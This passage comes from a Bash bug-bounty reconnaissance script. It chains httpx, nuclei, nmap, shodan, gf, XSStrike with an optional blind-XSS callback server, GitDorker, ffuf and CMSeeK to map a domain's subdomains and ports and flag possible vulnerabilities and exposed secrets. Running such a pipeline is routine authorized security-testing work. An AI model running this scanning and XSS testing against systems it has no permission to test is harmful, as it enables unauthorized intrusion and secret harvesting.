				NUMOFLINES=$(eval cat .tmp/permute_subs.txt $DEBUG_ERROR | anew ${domain}_subdomains.txt | wc -l)
			else
				NUMOFLINES=0
			fi
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			if [ "$NUMOFLINES" -gt 0 ]; then
				printf "${green} ${NUMOFLINES} new subdomains by permutations found in ${runtime}${reset}\n\n" | $NOTIFY
			fi
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

webprobe_simple(){
	if [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]
		then
			start=`date +%s`
			printf "${yellow} Running : Http probing${reset}\n\n" | $NOTIFY
			cat ${domain}_subdomains.txt | httpx -follow-host-redirects -H "${HEADER}" -status-code -timeout 15 -silent -no-color | cut -d ' ' -f1 | grep ".$domain$" | anew -q .tmp/${domain}_probed_tmp.txt
			deleteOutScoped $outOfScope_file .tmp/${domain}_probed_tmp.txt
			NUMOFLINES=$(eval cat .tmp/${domain}_probed_tmp.txt $DEBUG_ERROR | anew ${domain}_probed.txt | wc -l)
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			if [ "$NUMOFLINES" -gt 0 ]; then
				printf "${green} ${NUMOFLINES} new websites resolved in ${runtime}${reset}\n\n" | $NOTIFY
			fi
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

subtakeover(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$SUBTAKEOVER" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Running : Subdomain Takeover ${reset}\n\n" | $NOTIFY
			start=`date +%s`
			touch .tmp/tko.txt
			cat ${domain}_probed.txt | nuclei -silent -H "${HEADER}" -t ~/nuclei-templates/takeovers/ -o .tmp/tko.txt
			NUMOFLINES=$(eval cat .tmp/tko.txt $DEBUG_ERROR | anew ${domain}_takeover.txt | wc -l)
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			if [ "$NUMOFLINES" -gt 0 ]; then
				text="${bred}\n ${NUMOFLINES} new possible takeovers found in ${runtime}${reset}\n\n"
			fi
			printf "${text}" && printf "${text}" | $NOTIFY
			printf "${bblue}\n Subdomain Takeover Finished\n" | $NOTIFY
			printf "${bblue} Results are saved in ${domain}_takeover.txt${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

webprobe_full(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$WEBPROBEFULL" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} ${bgreen} Web Probe ${reset}\n\n" | $NOTIFY
			printf "${yellow} Running : Http probing non standard ports${reset}\n\n" | $NOTIFY
			start=`date +%s`
			cat ${domain}_subdomains.txt | httpx -ports 81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7396,7474,8000,8001,8008,8014,8042,8060,8069,8080,8081,8083,8088,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9001,9043,9060,9080,9090,9091,9200,9443,9502,9800,9981,10000,10250,11371,12443,15672,16080,17778,18091,18092,20720,32000,55672 -follow-host-redirects -H "${HEADER}" -status-code -threads 150 -timeout 10 -silent -no-color | cut -d ' ' -f1 | grep ".$domain" | anew -q .tmp/${domain}_probed_uncommon_ports.txt
			NUMOFLINES=$(eval cat .tmp/${domain}_probed_uncommon_ports.txt $DEBUG_ERROR | anew ${domain}_probed_uncommon_ports.txt | wc -l)
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			if [ "$NUMOFLINES" -gt 0 ]; then
				printf "${bred}\n Uncommon web ports: ${NUMOFLINES} new websites in ${runtime}${reset}\n\n" | $NOTIFY
				eval cat ${domain}_probed_uncommon_ports.txt $DEBUG_ERROR
			fi
			printf "${bblue}\n Web Probe Finished\n" | $NOTIFY
			printf "${bblue} Results are saved in ${domain}_probed_uncommon_ports.txt${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

brokenLinks(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$BROKENLINKS" = true ] ; then
		printf "${bgreen}#######################################################################\n"
		printf "${bblue} Running : Broken links checks ${reset}\n\n" | $NOTIFY
		start=`date +%s`
		interlace -tL ${domain}_probed.txt -threads 10 -c "wget --spider -r -nd -nv -H -l 1 -w 1 --no-check-certificate -U 'Mozilla' -o _output_/_cleantarget__brokenLinks.tmp _target_" -o .tmp &>/dev/null
		cat .tmp/*_brokenLinks.tmp | grep "^http" | grep -v ':$' | anew -q .tmp/brokenLinks_total.txt
		NUMOFLINES=$(eval cat .tmp/brokenLinks_total.txt $DEBUG_ERROR | cut -d ' ' -f2 | anew ${domain}_brokenLinks.txt | wc -l)
		touch $called_fn_dir/.${FUNCNAME[0]}
		end=`date +%s`
		getElapsedTime $start $end
		if [ "$NUMOFLINES" -gt 0 ]; then
			text="${bred}\n ${NUMOFLINES} new broken links found in ${runtime}${reset}\n\n"
		fi
		printf "${bblue}\n Broken links checks Finished in ${runtime}\n" | $NOTIFY
		printf "${bblue} Results are saved in ${domain}_brokenLinks.txt ${reset}\n"
		printf "${bgreen}#######################################################################\n\n"
	else
		printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

screenshot(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$WEBSCREENSHOT" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} ${bgreen} Running : Web Screenshot ${reset}\n\n" | $NOTIFY
			start=`date +%s`
			python3 $tools/webscreenshot/webscreenshot.py -i ${domain}_probed.txt -r chromium -w 4 -a "${HEADER}" -o screenshots &>/dev/null
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n Web Screenshot Finished in ${runtime}\n" | $NOTIFY
			printf "${bblue} Results are saved in screenshots folder${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

portscan(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$PORTSCANNER" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Running : Port Scan ${reset}\n\n" | $NOTIFY
			start=`date +%s`
			for sub in $(cat ${domain}_subdomains.txt); do
				echo "$sub $(dig +short a $sub | tail -n1)" | anew -q ${domain}_subdomains_ips.txt
			done

			cat ${domain}_subdomains_ips.txt | cut -d ' ' -f2 | cf-check -c $NPROC | egrep -iv "^(127|10|169|172|192)\." | anew -q .tmp/${domain}_ips_nowaf.txt

			printf "${bblue}\n Resolved IP addresses (No WAF) ${reset}\n\n" | $NOTIFY
			eval cat .tmp/${domain}_ips_nowaf.txt $DEBUG_ERROR | sort

			if [ "$PORTSCAN_PASSIVE" = true ]
			then
				for sub in $(cat .tmp/${domain}_ips_nowaf.txt); do
					shodan host $sub 2>/dev/null >> ${domain}_portscan_passive.txt && echo -e "\n\n#######################################################################\n\n" >> ${domain}_portscan_passive.txt
				done
			fi

			if [ "$PORTSCAN_ACTIVE" = true ]
			then
				eval nmap --top-ports 1000 -sV -n --max-retries 2 -iL .tmp/${domain}_ips_nowaf.txt -oN ${domain}_portscan_active.txt $DEBUG_STD
			fi

			#eval cat ${domain}_portscan.txt $DEBUG_ERROR
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n Port scan Finished in ${runtime}${reset}\n" | $NOTIFY
			printf "${bblue} Results are saved in ${domain}_portscan_[passive|active].txt${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

nuclei_check(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$NUCLEICHECK" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Running : Template Scanning with Nuclei ${reset}\n\n" | $NOTIFY
			start=`date +%s`
			eval nuclei -update-templates $DEBUG_STD
			mkdir -p nuclei_output
			printf "${yellow} Running : Nuclei Technologies${reset}\n\n" | $NOTIFY
			cat ${domain}_probed.txt | nuclei -silent -H "${HEADER}" -t ~/nuclei-templates/technologies/ -o nuclei_output/${domain}_technologies.txt;
			printf "${yellow}\n\n Running : Nuclei Tokens${reset}\n\n" | $NOTIFY
			cat ${domain}_probed.txt | nuclei -silent -H "${HEADER}" -t ~/nuclei-templates/exposed-tokens/ -o nuclei_output/${domain}_tokens.txt;
			printf "${yellow}\n\n Running : Nuclei Exposures${reset}\n\n" | $NOTIFY
			cat ${domain}_probed.txt | nuclei -silent -H "${HEADER}" -t ~/nuclei-templates/exposures/ -o nuclei_output/${domain}_exposures.txt;
			printf "${yellow}\n\n Running : Nuclei CVEs ${reset}\n\n" | $NOTIFY
			cat ${domain}_probed.txt | nuclei -silent -H "${HEADER}" -t ~/nuclei-templates/cves/ -o nuclei_output/${domain}_cves.txt;
			printf "${yellow}\n\n Running : Nuclei Default Creds ${reset}\n\n" | $NOTIFY
			cat ${domain}_probed.txt | nuclei -silent -H "${HEADER}" -t ~/nuclei-templates/default-logins/ -o nuclei_output/${domain}_default_creds.txt;
			printf "${yellow}\n\n Running : Nuclei DNS ${reset}\n\n" | $NOTIFY
			cat ${domain}_probed.txt | nuclei -silent -H "${HEADER}" -t ~/nuclei-templates/dns/ -o nuclei_output/${domain}_dns.txt;
			printf "${yellow}\n\n Running : Nuclei Panels ${reset}\n\n" | $NOTIFY
			cat ${domain}_probed.txt | nuclei -silent -H "${HEADER}" -t ~/nuclei-templates/exposed-panels/ -o nuclei_output/${domain}_panels.txt;
			printf "${yellow}\n\n Running : Nuclei Security Misconfiguration ${reset}\n\n" | $NOTIFY
			cat ${domain}_probed.txt | nuclei -silent -H "${HEADER}" -t ~/nuclei-templates/misconfiguration/ -o nuclei_output/${domain}_misconfigurations.txt;
			printf "${yellow}\n\n Running : Nuclei Vulnerabilites ${reset}\n\n" | $NOTIFY
			cat ${domain}_probed.txt | nuclei -silent -H "${HEADER}" -t ~/nuclei-templates/vulnerabilities/ -o nuclei_output/${domain}_vulnerabilities.txt && touch $called_fn_dir/.${FUNCNAME[0]};
			printf "\n\n"
			end=`date +%s`
			getElapsedTime $start $end
			text="${bblue}\n Nuclei Scan Finished in ${runtime}\n" | $NOTIFY
			printf "${text}" && printf "${text}" | $NOTIFY
			printf "${bblue} Results are saved in nuclei_output folder ${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

urlchecks(){
	if [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Running : URL Extraction ${reset}\n\n"
			start=`date +%s`
			cat ${domain}_probed.txt | waybackurls | anew -q .tmp/${domain}_url_extract_tmp.txt
			cat ${domain}_probed.txt | gau | anew -q .tmp/${domain}_url_extract_tmp.txt
			if [ "$DEEP" = true ] ; then
				cat ${domain}_probed.txt | hakrawler -urls -plain -linkfinder -insecure -depth 2 | anew -q .tmp/${domain}_url_extract_tmp.txt
			else
				cat ${domain}_probed.txt | hakrawler -urls -plain -linkfinder -insecure | anew -q .tmp/${domain}_url_extract_tmp.txt
			fi
			if [ -s "${GITHUB_TOKENS}" ]
			then
				eval github-endpoints -q -k -d $domain -t ${GITHUB_TOKENS} -raw $DEBUG_ERROR | anew -q .tmp/${domain}_url_extract_tmp.txt
			fi
			eval cat .tmp/${domain}_url_extract_tmp.txt ${domain}_param.txt $DEBUG_ERROR | grep "${domain}" | grep "=" | eval qsreplace -a $DEBUG_ERROR | egrep -iv "\.(eot|jpg|jpeg|gif|css|tif|tiff|png|ttf|otf|woff|woff2|ico|pdf|svg|txt|js)" | anew -q .tmp/${domain}_url_extract_tmp2.txt
			cat .tmp/${domain}_url_extract_tmp.txt | grep "${domain}" | egrep -i "\.(js)" | anew -q ${domain}_url_extract_js.txt
			eval uddup -u .tmp/${domain}_url_extract_tmp2.txt -o .tmp/${domain}_url_extract_uddup.txt $DEBUG_STD
			NUMOFLINES=$(eval cat .tmp/${domain}_url_extract_uddup.txt $DEBUG_ERROR | anew ${domain}_url_extract.txt | wc -l)
			touch $called_fn_dir/.${FUNCNAME[0]};
			end=`date +%s`
			getElapsedTime $start $end
			text="${bblue}\n URL Extraction Finished\n"
			printf "${text}" && printf "${text}" | $NOTIFY
			if [ "$NUMOFLINES" -gt 0 ]; then
				text="${bblue}\n ${NUMOFLINES} new urls in ${runtime}\n"
				printf "${text}" && printf "${text}" | $NOTIFY
			fi
			printf "${bblue} Results are saved in ${domain}_url_extract.txt${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

wordlist_gen(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$WORDLIST" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Running : Wordlist generation ${reset}\n\n" | $NOTIFY
			start=`date +%s`

			cat .tmp/${domain}_url_extract_tmp.txt | unfurl -u keys | sed 's/[][]//g' | sed 's/[#]//g' | sed 's/[}{]//g' | anew -q ${domain}_dict_words.txt
			cat .tmp/${domain}_url_extract_tmp.txt | unfurl -u path | anew -q ${domain}_dict_paths.txt

			text="${bblue}\n Wordlists Generated\n"
			printf "${text}" && printf "${text}" | $NOTIFY
			printf "${bblue} Results are saved in ${domain}_dict_[words|paths].txt${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

url_gf(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$URL_GF" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Running : gf Vulnerable Pattern Search ${reset}\n\n" | $NOTIFY
			start=`date +%s`
			mkdir -p gf
			gf xss ${domain}_url_extract.txt | anew -q gf/${domain}_xss.txt
			gf ssti ${domain}_url_extract.txt | anew -q gf/${domain}_ssti.txt
			gf ssrf ${domain}_url_extract.txt | anew -q gf/${domain}_ssrf.txt
			gf sqli ${domain}_url_extract.txt | anew -q gf/${domain}_sqli.txt
			gf redirect ${domain}_url_extract.txt | anew -q gf/${domain}_redirect.txt && cat gf/${domain}_ssrf.txt | anew -q gf/${domain}_redirect.txt
			gf rce ${domain}_url_extract.txt | anew -q gf/${domain}_rce.txt
			gf potential ${domain}_url_extract.txt | cut -d ':' -f3-5 |anew -q gf/${domain}_potential.txt
			cat ${domain}_url_extract.txt | unfurl -u format %s://%d%p | anew -q gf/${domain}_endpoints.txt
			gf lfi ${domain}_url_extract.txt | anew -q gf/${domain}_lfi.txt
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n Vulnerable Pattern Search Finished in ${runtime}\n" | $NOTIFY
			printf "${bblue} Results are saved in gf folder${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

jschecks(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$JSCHECKS" = true ]
		then
			if [ "$DEEP" = true ] ; then
				printf "${bgreen}#######################################################################\n"
				printf "${bblue} Running : Javascript Scan ${reset}\n\n" | $NOTIFY
				start=`date +%s`
				printf "${yellow} Running : Fetching Urls 1/5${reset}\n" | $NOTIFY
				cat ${domain}_url_extract_js.txt | grep -iE "\.js$" | anew -q ${domain}_jsfile_links.txt;
				cat ${domain}_url_extract_js.txt | subjs | anew -q ${domain}_jsfile_links.txt;
				printf "${yellow} Running : Resolving JS Urls 2/5${reset}\n" | $NOTIFY
				cat ${domain}_jsfile_links.txt | httpx -follow-host-redirects -H "${HEADER}" -silent -timeout 15 -status-code -no-color | cut -d ' ' -f1 | anew -q ${domain}_js_livelinks.txt
				printf "${yellow} Running : Gathering endpoints 3/5${reset}\n" | $NOTIFY
				interlace -tL ${domain}_js_livelinks.txt -threads 10 -c "python3 $tools/LinkFinder/linkfinder.py -d -i _target_ -o cli >> ${domain}_js_endpoints.txt" &>/dev/null
				eval sed -i '/^Running against/d; /^Invalid input/d; /^$/d' ${domain}_js_endpoints.txt $DEBUG_ERROR
				printf "${yellow} Running : Gathering secrets 4/5${reset}\n" | $NOTIFY
				cat ${domain}_js_livelinks.txt | nuclei -silent -t ~/nuclei-templates/exposed-tokens/ -o ${domain}_js_secrets.txt
				printf "${yellow} Running : Building wordlist 5/5${reset}\n" | $NOTIFY
				cat ${domain}_js_livelinks.txt | python3 $tools/getjswords.py | anew -q ${domain}_js_Wordlist.txt && touch $called_fn_dir/.${FUNCNAME[0]}
				end=`date +%s`
				getElapsedTime $start $end
				printf "${bblue}\n Javascript Scan Finished in ${runtime}\n" | $NOTIFY
				printf "${bblue} Results are saved in ${domain}_js_*.txt files${reset}\n"
				printf "${bgreen}#######################################################################\n\n"
			fi
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

params(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$PARAMS" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Running : Parameter Discovery ${reset}\n" | $NOTIFY
			start=`date +%s`
			printf "${yellow}\n\n Running : Searching params with paramspider${reset}\n" | $NOTIFY
			cat ${domain}_probed.txt | sed -r "s/https?:\/\///" | anew -q .tmp/${domain}_probed_nohttp.txt
			interlace -tL .tmp/${domain}_probed_nohttp.txt -threads 10 -c "python3 $tools/ParamSpider/paramspider.py -d _target_ -l high -q --exclude eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,pdf,svg,txt,js" &>/dev/null && touch $called_fn_dir/.${FUNCNAME[0]}
			cat output/*.txt | anew -q .tmp/${domain}_param_tmp.txt
			sed '/^FUZZ/d' -i .tmp/${domain}_param_tmp.txt
			eval rm -rf output/ $DEBUG_ERROR
			if [ "$DEEP" = true ] ; then
				printf "${yellow}\n\n Running : Checking ${domain} with Arjun${reset}\n" | $NOTIFY
				eval arjun -i .tmp/${domain}_param_tmp.txt -t 20 -oT ${domain}_param.txt $DEBUG_STD && touch $called_fn_dir/.${FUNCNAME[0]}
			else
				if [[ $(cat .tmp/${domain}_param_tmp.txt | wc -l) -le 50 ]]
				then
					printf "${yellow}\n\n Running : Checking ${domain} with Arjun${reset}\n" | $NOTIFY
					eval arjun -i .tmp/${domain}_param_tmp.txt -t 20 -oT ${domain}_param.txt $DEBUG_STD && touch $called_fn_dir/.${FUNCNAME[0]}
				else
					cp .tmp/${domain}_param_tmp.txt ${domain}_param.txt
				fi
			fi
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n Parameter Discovery Finished in ${runtime}\n" | $NOTIFY
			printf "${bblue} Results are saved in ${domain}_param.txt${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

xss(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$XSS" = true ]
	then
		printf "${bgreen}#######################################################################\n"
		printf "${bblue} Running : XSS Analysis ${reset}\n\n" | $NOTIFY
		start=`date +%s`
		cat gf/${domain}_xss.txt | qsreplace FUZZ | Gxss -c 100 -p Xss | anew -q .tmp/${domain}_xss_reflected.txt
		if [ "$DEEP" = true ] ; then
			if [ -n "$XSS_SERVER" ]; then
				sed -i "s/^blindPayload = \x27\x27/blindPayload = \x27${XSS_SERVER}\x27/" $tools/XSStrike/core/config.py
				eval python3 $tools/XSStrike/xsstrike.py --seeds .tmp/${domain}_xss_reflected.txt -t 30 --crawl --blind --skip > ${domain}_xss.txt $DEBUG_STD && touch $called_fn_dir/.${FUNCNAME[0]}
			else
				printf "${yellow}\n No XSS_SERVER defined, blind xss skipped\n\n" | $NOTIFY
				eval python3 $tools/XSStrike/xsstrike.py --seeds .tmp/${domain}_xss_reflected.txt -t 30 --crawl --skip > ${domain}_xss.txt $DEBUG_STD && touch $called_fn_dir/.${FUNCNAME[0]}
			fi
		else
			if [[ $(cat .tmp/${domain}_xss_reflected.txt | wc -l) -le 200 ]]
			then
				if [ -n "$XSS_SERVER" ]; then
					sed -i "s/^blindPayload = \x27\x27/blindPayload = \x27${XSS_SERVER}\x27/" $tools/XSStrike/core/config.py
					eval python3 $tools/XSStrike/xsstrike.py --seeds .tmp/${domain}_xss_reflected.txt -t 30 --crawl --blind --skip > ${domain}_xss.txt $DEBUG_STD && touch $called_fn_dir/.${FUNCNAME[0]}
				else
					printf "${yellow}\n No XSS_SERVER defined, blind xss skipped\n\n" | $NOTIFY
					eval python3 $tools/XSStrike/xsstrike.py --seeds .tmp/${domain}_xss_reflected.txt -t 30 --crawl --skip > ${domain}_xss.txt $DEBUG_STD && touch $called_fn_dir/.${FUNCNAME[0]}
				fi
			else
				printf "${bred} Skipping XSS: Too Much URLs to test, try with --deep flag${reset}\n" | $NOTIFY
			fi
		fi
		end=`date +%s`
		getElapsedTime $start $end
		printf "${bblue}\n XSS Analysis Finished in ${runtime}\n" | $NOTIFY
		printf "${bblue} Results are saved in ${domain}_xss.txt${reset}\n"
		printf "${bgreen}#######################################################################\n\n"
	else
		printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

github(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$GITHUB" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Running : GitHub Scanning ${reset}\n\n" | $NOTIFY
			start=`date +%s`
			if [ -s "${GITHUB_TOKENS}" ]
			then
				if [ "$DEEP" = true ] ; then
					eval python3 $tools/GitDorker/GitDorker.py -tf ${GITHUB_TOKENS} -e 5 -q $domain -p -d $tools/GitDorker/Dorks/alldorksv3 | grep "\[+\]" | anew -q ${domain}_gitrecon.txt $DEBUG_STD
				else
					eval python3 $tools/GitDorker/GitDorker.py -tf ${GITHUB_TOKENS} -e 5 -q $domain -p -d $tools/GitDorker/Dorks/medium_dorks.txt | grep "\[+\]" | anew -q ${domain}_gitrecon.txt $DEBUG_STD
				fi
				sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" ${domain}_gitrecon.txt
			else
				printf "\n${bred} Required file ${GITHUB_TOKENS} not exists or empty${reset}\n" | $NOTIFY
			fi
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n GitHub Scanning Finished in ${runtime}\n" | $NOTIFY
			printf "${bblue} Results are saved in ${domain}_gitrecon.txt${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

favicon(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$FAVICON" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Running : FavIcon Hash Extraction ${reset}\n\n" | $NOTIFY
			start=`date +%s`
			cd $tools/fav-up
			eval shodan init $SHODAN_API_KEY $DEBUG_STD
			eval python3 favUp.py -w $domain -sc -o favicontest.json $DEBUG_STD
			if [ -f "favicontest.json" ]
			then
				cat favicontest.json | jq > ${domain}_favicontest.txt
				eval cat ${domain}_favicontest.txt $DEBUG_ERROR | grep found_ips
				mv favicontest.json $dir/favicontest.json
			fi
			cd $dir && touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n FavIcon Hash Extraction Finished in ${runtime}\n" | $NOTIFY
			printf "${bblue} Results are saved in ${domain}_favicontest.txt${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

fuzz(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$FUZZ" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Running : Directory Fuzzing ${reset}\n" | $NOTIFY
			printf "${yellow}\n\n Fuzzing subdomains with ${fuzz_wordlist}${reset}\n\n" | $NOTIFY
			start=`date +%s`
			mkdir -p $dir/fuzzing
			for sub in $(cat ${domain}_probed.txt); do
				printf "${yellow}\n\n Running: Fuzzing in ${sub}${reset}\n" | $NOTIFY
				sub_out=$(echo $sub | sed -e 's|^[^/]*//||' -e 's|/.*$||')
				ffuf -mc all -fc 404 -ac -sf -s -H "${HEADER}" -w $fuzz_wordlist -maxtime 900 -u $sub/FUZZ -or -o $dir/fuzzing/${sub_out}.tmp &>/dev/null
				eval cat $dir/fuzzing/${sub_out}.tmp $DEBUG_ERROR | jq '[.results[]|{status: .status, length: .length, url: .url}]' | grep -oP "status\":\s(\d{3})|length\":\s(\d{1,7})|url\":\s\"(http[s]?:\/\/.*?)\"" | paste -d' ' - - - | awk '{print $2" "$4" "$6}' | sed 's/\"//g' | anew -q $dir/fuzzing/${sub_out}.txt
				eval rm $dir/fuzzing/${sub_out}.tmp $DEBUG_ERROR
			done
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n Directory Fuzzing Finished in ${runtime}\n" | $NOTIFY
			printf "${bblue} Results are saved in fuzzing/*subdomain*.txt${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

cms_scanner(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$CMS_SCANNER" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Running : CMS Scanner ${reset}\n" | $NOTIFY
			start=`date +%s`
			mkdir -p $dir/cms && rm -rf $dir/cms/*
			tr '\n' ',' < ${domain}_probed.txt > .tmp/${domain}_cms.txt
			eval python3 $tools/CMSeeK/cmseek.py -l .tmp/${domain}_cms.txt --batch -r $DEBUG_STD
			for sub in $(cat ${domain}_probed.txt); do
				sub_out=$(echo $sub | sed -e 's|^[^/]*//||' -e 's|/.*$||')
				cms_id=$(cat $tools/CMSeeK/Result/${sub_out}/cms.json | jq -r '.cms_id')
				if [ -z "$cms_id" ]
				then
					rm -rf $tools/CMSeeK/Result/${sub_out}
				else
					mv -f $tools/CMSeeK/Result/${sub_out} $dir/cms/
				fi
			done
			#eval rm ${domain}_cms.txt $DEBUG_ERROR
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n CMS Scanner finished in ${runtime}\n" | $NOTIFY
			printf "${bblue} Results are saved in cms/*subdomain* folder${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

